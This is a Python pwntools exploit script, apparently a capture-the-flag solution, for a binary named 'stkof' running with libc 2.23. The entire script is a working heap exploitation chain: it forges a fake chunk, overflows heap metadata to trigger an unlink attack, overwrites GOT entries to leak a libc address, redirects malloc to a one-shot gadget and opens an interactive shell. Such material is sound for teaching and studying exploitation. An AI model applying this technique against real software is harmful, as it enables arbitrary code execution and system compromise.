from pwn import *

target = process("./stkof", env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF("stkof")
libc = ELF("libc-2.23.so")

#gdb.attach(target, gdbscript='b *0x400b7a')

# I/O Functions
def add(size):
  target.sendline("1")
  target.sendline(str(size))
  print target.recvuntil("OK\n")

def scan(index, size, data):
  target.sendline("2")
  target.sendline(str(index))
  target.sendline(str(size))
  target.send(data)
  print target.recvuntil("OK\n")

def remove(index):
  target.sendline("3")
  target.sendline(str(index))
  print target.recvuntil("OK\n")

def view(index):
  target.sendline("4")
  target.sendline(str(index))
  #print "pillar"
  leak = target.recvline()
  leak = leak.replace("\x0a", "")
  leak = u64(leak + "\x00"*(8-len(leak)))
  print hex(leak)
  #print "men"
  print target.recvuntil("OK\n")
  return leak

# The array of ptrs starts at 0x602140
# 0x602160 contains the specific heap chunk ptr to the chunk which will hold our fake chunk in it
ptr = 0x602160

# Allocate several different chunks so we can get adjacent chunks
add(0xa0)
add(0xa0)
add(0xa0)
add(0xa0)# The chunk which will store our fake chunk
add(0xa0)
add(0xa0)

# Construct the fake chunk

fakeChunk = ""
fakeChunk += p64(0x0)   # Previous Size
fakeChunk += p64(0xa0)    # Size
fakeChunk += p64(ptr - 0x8*3) # FD ptr
fakeChunk += p64(ptr - 0x8*2) # BK ptr
fakeChunk += p64(0x0)*((0xa0 - 0x20)/8) # FD Next Size / filler to the next chunks heap metadata

# These 16 bytes will overflow into the next chunks heap metadata

fakeChunk += p64(0xa0)  # Previous Size
fakeChunk += p64(0xb0)  # Size

# Send the data for the fake chunk and the heap metadata overflow
scan(4, 0xb0, fakeChunk)

# Trigger the unlink attack by freeing the chunk with the overflowed heap metadata
remove(5)

# Write the got addresses of strlen and malloc to 0x602148 (array of ptrs of heap address)
scan(4, 0x10, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))

# Overwrite got entry for strlen with plt address of puts
scan(1, 0x8, p64(elf.symbols["puts"]))

# Leak the libc address of malloc, calculate libc base and oneshot gadget address
mallocLibc = view(2)
libcBase = mallocLibc - libc.symbols["malloc"]
oneShot = libcBase + 0xf02a4

print "libc base: " + hex(libcBase)
print "oneshot gadget: " + hex(oneShot)

# Overwrite got entry for malloc with oneshot gadget
scan(2, 0x8, p64(oneShot))

# Call malloc
target.send("1\n1\n")

# Enjoy your shell!
target.interactive()